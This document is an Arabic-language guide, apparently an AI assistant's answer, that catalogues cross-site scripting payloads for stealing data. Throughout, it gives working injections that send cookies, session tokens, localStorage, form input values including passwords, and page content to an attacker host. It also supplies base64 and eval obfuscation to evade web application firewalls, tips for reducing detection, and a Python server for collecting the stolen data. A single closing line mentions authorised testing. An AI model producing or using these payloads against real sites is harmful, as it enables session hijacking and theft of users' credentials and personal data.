
## الخطوات العملية للحقن المستخدمة لاستخراج البيانات
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات الصادرة.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المستلمة.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - تأكد من وجود ثغرة XSS ناجحة (مثل تنفيذ `<script>alert('XSS')</script>`).

2. **تحديد البيانات المستهدفة**:
   - حدد البيانات الحساسة التي يمكن استخراجها، مثل:
     - ملفات تعريف الارتباط: `document.cookie`.
     - محتوى الصفحة: `document.body.innerHTML`، `document.getElementById('username').innerText`.
     - بيانات الجلسة: `localStorage`، `sessionStorage`.
     - بيانات المستخدم: عناصر مثل `<input>` أو `<span>` تحتوي على أسماء أو بريد إلكتروني.
   - افحص شيفرة الصفحة (عبر أدوات المطورين) لتحديد معرفات العناصر (IDs) أو الفئات (classes).

3. **إدخال الحقن**:
   - أدخل شيفرة JavaScript في نقطة الإدخال العرضة لـ XSS (مثل معلمة URL أو حقل تعليق).
   - صمم الحقنة لجمع البيانات وإرسالها إلى خادمك، مثل:
     - `<script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>`
     - `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
   - جرب الحقن في سياقات مختلفة:
     - معلمات URL: `https://example.com/?search=<script>new Image().src='http://attacker.com/log?c='+document.cookie</script>`
     - حقول نماذج: أدخل `<img src=x onerror=new Image().src='http://attacker.com/log?c='+document.cookie>` في تعليق.
     - الهاش: `https://example.com/#<script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>`

4. **مراقبة الاستجابات**:
   - تحقق من خادمك الخارجي لتأكيد استلام البيانات:
     - **نجاح (True)**: البيانات (مثل ملفات تعريف الارتباط أو محتوى الصفحة) تظهر في سجلات الخادم.
     - **فشل (False)**: لا تصل بيانات، أو يتم حظر الطلب (مثل بسبب CSP أو CORS).
   - استخدم أدوات المطورين (F12) لمراقبة طلبات الشبكة الصادرة (Network tab) للتأكد من إرسال البيانات.
   - تحقق من وجود أخطاء (مثل `blocked by CORS policy`) لتحديد القيود.

5. **تجربة طرق إرسال مختلفة**:
   - إذا فشلت الحقنة (مثل حظر الطلب بسبب CSP)، جرب طرق إرسال أخرى:
     - صور: `<img src="http://attacker.com/log?c=<data>">`
     - طلبات POST: `<script>fetch('http://attacker.com/log', {method: 'POST', body: <data>})</script>`
     - WebSocket: `<script>new WebSocket('ws://attacker.com').send(<data>)</script>`
   - جرب تشفير البيانات (مثل `encodeURIComponent`) لتجنب الأخطاء النحوية.
   - اختبر نقاط إدخال متعددة (مثل حقول نماذج أخرى أو معلمات URL مختلفة).

6. **تأكيد النطاق وتقليل الكشف (اختياري)**:
   - استخدم حقن تكشف نطاق التنفيذ (مثل `<script>new Image().src='http://attacker.com/log?d='+document.domain</script>`).
   - قلل حجم البيانات المرسلة (مثل إرسال `document.cookie` فقط بدلاً من `document.body.innerHTML`) لتجنب الكشف.
   - استخدم تقنيات التعتيم (مثل تقسيم الشيفرة أو التشفير) لتجاوز أنظمة الكشف عن الهجمات (WAF).

---

## جميع المحاولات الممكنة للحقن المستخدمة لاستخراج البيانات
في الحقن المستخدمة لاستخراج البيانات، المحاولات تركز على جمع البيانات الحساسة وإرسالها إلى خادم خارجي. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة لـ XSS.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في حقول النماذج، معلمات URL، أو نقاط إدخال أخرى. الهدف هو استخراج البيانات وإرسالها إلى خادم المهاجم.

#### أ. استخراج ملفات تعريف الارتباط
استخدام `document.cookie` لسرقة بيانات الجلسة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم كمعلمة URL.
  - **متى يُستخدم؟**: لسرقة بيانات الجلسة إذا لم يكن `HttpOnly` مفعلاً.
- **الحقن**: `<img src="http://attacker.com/log?c=document.cookie">`
  - **الإدخال**: `https://example.com/?search=<img src="http://attacker.com/log?c=document.cookie">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر طلب صورة.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر `<script>`.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>`
  - **الإدخال**: أدخل في نموذج: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر طلب POST.
  - **متى يُستخدم؟**: لإرسال بيانات أكبر أو لتجاوز قيود GET.
- **الحقن**: `<script>new WebSocket('ws://attacker.com').send(document.cookie)</script>`
  - **الإدخال**: `https://example.com/#<script>new WebSocket('ws://attacker.com').send(document.cookie)</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر WebSocket.
  - **متى يُستخدم؟**: لتجاوز قيود HTTP أو CSP.
- **الحقن**: `<script>navigator.sendBeacon('http://attacker.com/log', document.cookie)</script>`
  - **الإدخال**: أدخل في حقل: `<script>navigator.sendBeacon('http://attacker.com/log', document.cookie)</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط بشكل غير متزامن.
  - **متى يُستخدم؟**: لإرسال بيانات بشكل موثوق حتى عند إغلاق الصفحة.

#### ب. استخراج محتوى DOM
استخدام DOM لجمع محتوى الصفحة أو عناصر محددة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.body.innerHTML)</script>`
  - **الإدخال**: `https://example.com/?search=<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.body.innerHTML)</script>`
  - **كيف يعمل**: يرسل محتوى الصفحة بالكامل إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى الصفحة (مثل النصوص أو HTML).
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.getElementById('username').innerText})</script>`
  - **الإدخال**: أدخل في تعليق: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.getElementById('username').innerText})</script>`
  - **كيف يعمل**: يرسل نص عنصر معين (مثل اسم المستخدم).
  - **متى يُستخدم؟**: لاستهداف بيانات مستخدم محددة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.querySelector('.email').innerText)</script>`
  - **الإدخال**: `https://example.com/#<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.querySelector('.email').innerText)</script>`
  - **كيف يعمل**: يرسل نص عنصر محدد باستخدام CSS selector.
  - **متى يُستخدم؟**: لاستخراج بيانات من عناصر بفئات معينة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(Array.from(document.getElementsByTagName('input')).map(i => i.value))})</script>`
  - **الإدخال**: أدخل في نموذج: `<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(Array.from(document.getElementsByTagName('input')).map(i => i.value))})</script>`
  - **كيف يعمل**: يرسل قيم جميع حقول الإدخال (مثل كلمات المرور).
  - **متى يُستخدم؟**: لجمع بيانات النماذج.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.title)</script>`
  - **الإدخال**: `https://example.com/?search=<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.title)</script>`
  - **كيف يعمل**: يرسل عنوان الصفحة.
  - **متى يُستخدم؟**: لاستخراج معلومات وصفية.

#### ج. استخراج بيانات التخزين
استخدام `localStorage` و`sessionStorage` لسرقة بيانات الجلسة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **الإدخال**: أدخل في حقل: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة رموز المصادقة.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(sessionStorage)})</script>`
  - **الإدخال**: `https://example.com/#<script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(sessionStorage)})</script>`
  - **كيف يعمل**: يرسل جميع بيانات `sessionStorage`.
  - **متى يُستخدم؟**: لجمع بيانات الجلسة المؤقتة.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('userData'))</script>`
  - **الإدخال**: أدخل في تعليق: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('userData'))</script>`
  - **كيف يعمل**: يرسل بيانات مستخدم من `localStorage`.
  - **متى يُستخدم؟**: لاستخراج بيانات المستخدم المخزنة.

#### د. استخراج بيانات السياق
استخدام معلومات السياق مثل النطاق أو موقع المستخدم.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.domain)</script>`
  - **الإدخال**: `https://example.com/?search=<script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.domain)</script>`
  - **كيف يعمل**: يرسل نطاق الصفحة.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?l='+encodeURIComponent(window.location.href)</script>`
  - **الإدخال**: أدخل في نموذج: `<script>new Image().src='http://attacker.com/log?l='+encodeURIComponent(window.location.href)</script>`
  - **كيف يعمل**: يرسل عنوان URL الحالي.
  - **متى يُستخدم؟**: لتتبع موقع الضحية.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: navigator.userAgent})</script>`
  - **الإدخال**: `https://example.com/#<script>fetch('http://attacker.com/log', {method: 'POST', body: navigator.userAgent})</script>`
  - **كيف يعمل**: يرسل معلومات المتصفح.
  - **متى يُستخدم؟**: لجمع بيانات الجهاز.

#### هـ. حقن مع التعتيم
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?c='+btoa(document.cookie)</script>`
  - **الإدخال**: أدخل في حقل: `<script>new Image().src='http://attacker.com/log?c='+btoa(document.cookie)</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط مشفرة بـ Base64.
  - **متى يُستخدم؟**: لتجنب فلاتر WAF.
- **الحقن**: `<script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9jPScrZG9jdW1lbnQuY29va2ll'))</script>`
  - **الإدخال**: `https://example.com/?search=<script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9jPScrZG9jdW1lbnQuY29va2ll'))</script>`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لتجاوز أنظمة الكشف.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?c='+(document['cookie'].split('').reverse().join(''))</script>`
  - **الإدخال**: أدخل في تعليق: `<script>new Image().src='http://attacker.com/log?c='+(document['cookie'].split('').reverse().join(''))</script>`
  - **كيف يعمل**: يعكس ملفات تعريف الارتباط قبل الإرسال.
  - **متى يُستخدم؟**: لتجنب فلاتر البحث عن الكلمات.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests`) لأتمتة اختبار مجموعة من الحقن المستخدمة لاستخراج البيانات وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تجمع بيانات مختلفة.
  - مثال قائمة:
    ```
    <script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>
    <script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>
    <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>
    <img src="http://attacker.com/log?c=document.cookie">
    <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.domain)</script>
    ```
- **كيف يعمل**:
  - يتم إرسال كل حقنة عبر نقطة إدخال XSS.
  - يتم مراقبة الخادم الخارجي لتأكيد استلام البيانات.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع خادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

  payloads = [
      "<script>new Image().src='http://localhost:8000/log?c='+encodeURIComponent(document.cookie)</script>",
      "<script>fetch('http://localhost:8000/log', {method: 'POST', body: document.body.innerHTML})</script>",
      "<script>new Image().src='http://localhost:8000/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>",
      "<img src='http://localhost:8000/log?c=document.cookie'>",
      "<script>new Image().src='http://localhost:8000/log?d='+encodeURIComponent(document.domain)</script>"
  ]

  print("ابدأ اختبار الحقن:")
  for payload in payloads:
      print(f"اختبار: {payload}")
      # يمكن إدخال الحقن يدويًا أو عبر أداة مثل Selenium
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُدرج الحقن يدويًا أو عبر أدوات (مثل Selenium) في نقاط الإدخال.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي ومراقبة البيانات.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن البيانات المستلمة في الخادم:
    - **ملفات تعريف الارتباط**: تحقق من وجود `sessionid` أو رموز الجلسة.
    - **محتوى DOM**: تحقق من النصوص أو العناصر المستخرجة.
    - **بيانات التخزين**: تحقق من الرموز أو بيانات المستخدم.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`， فهذا يؤكد نجاح استخراج ملفات تعريف الارتباط.
- **كيف يعمل**:
  - يتم تسجيل البيانات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد البيانات القابلة للاستخراج.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<script>navigator.sendBeacon('http://attacker.com/log', document.cookie)</script>`).
  - جرب تقنيات إرسال أخرى (مثل FormData أو JSON).
  - اختبر استخراج بيانات أخرى (مثل `navigator.geolocation` للموقع).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(navigator.userAgent)</script>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للبيانات.

---



1. استخراج ملفات تعريف الارتباط:
- <script>new Image().src='http://attacker.com/log?c='+encodeURIComponent(document.cookie)</script>: يرسل ملفات تعريف الارتباط كمعلمة URL.
- <img src="http://attacker.com/log?c=document.cookie">: يرسل ملفات تعريف الارتباط عبر طلب صورة.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.cookie})</script>: يرسل ملفات تعريف الارتباط عبر POST.
- <script>new WebSocket('ws://attacker.com').send(document.cookie)</script>: يرسل ملفات تعريف الارتباط عبر WebSocket.
- <script>navigator.sendBeacon('http://attacker.com/log', document.cookie)</script>: يرسل ملفات تعريف الارتباط بشكل غير متزامن.

2. استخراج محتوى DOM:
- <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.body.innerHTML)</script>: يرسل محتوى الصفحة بالكامل.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.getElementById('username').innerText})</script>: يرسل نص عنصر معين.
- <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.querySelector('.email').innerText)</script>: يرسل نص عنصر بـ CSS selector.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(Array.from(document.getElementsByTagName('input')).map(i => i.value))})</script>: يرسل قيم حقول الإدخال.
- <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.title)</script>: يرسل عنوان الصفحة.

3. استخراج بيانات التخزين:
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>: يرسل رمز الجلسة من localStorage.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(sessionStorage)})</script>: يرسل جميع بيانات sessionStorage.
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('userData'))</script>: يرسل بيانات مستخدم من localStorage.

4. استخراج بيانات السياق:
- <script>new Image().src='http://attacker.com/log?d='+encodeURIComponent(document.domain)</script>: يرسل نطاق الصفحة.
- <script>new Image().src='http://attacker.com/log?l='+encodeURIComponent(window.location.href)</script>: يرسل عنوان URL الحالي.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: navigator.userAgent})</script>: يرسل معلومات المتصفح.

5. حقن مع التعتيم:
- <script>new Image().src='http://attacker.com/log?c='+btoa(document.cookie)</script>: يرسل ملفات تعريف الارتباط مشفرة بـ Base64.
- <script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuY29tL2xvZz9jPScrZG9jdW1lbnQuY29va2ll'))</script>: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
- <script>new Image().src='http://attacker.com/log?c='+(document['cookie'].split('').reverse().join(''))</script>: يعكس ملفات تعريف الارتباط قبل الإرسال.



---

**نصائح إضافية**:
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو خدمات مثل `ngrok` لتسجيل البيانات بسهولة.
- **تجنب القيود**: تحقق من وجود `HttpOnly` لملفات تعريف الارتباط أو CSP لتعديل الحقن (مثل استخدام WebSocket بدلاً من HTTP).
- **التعتيم**: استخدم تشفير Base64، تقسيم الشيفرة، أو تقنيات التعتيم لتجنب الكشف بواسطة WAF أو أنظمة الأمان.
- **اختبار النطاق**: ابدأ بحقن تؤكد النطاق (مثل إرسال `document.domain`) لفهم سياق التنفيذ.
- **الأدوات**: استخدم Burp Suite لمراقبة الطلبات الصادرة وأدوات المطورين (F12) لفحص DOM والشبكة.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Stored XSS Payloads" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل استخراج بيانات من تطبيقات SPA)، أخبرني وسأقدم ردًا مخصصًا!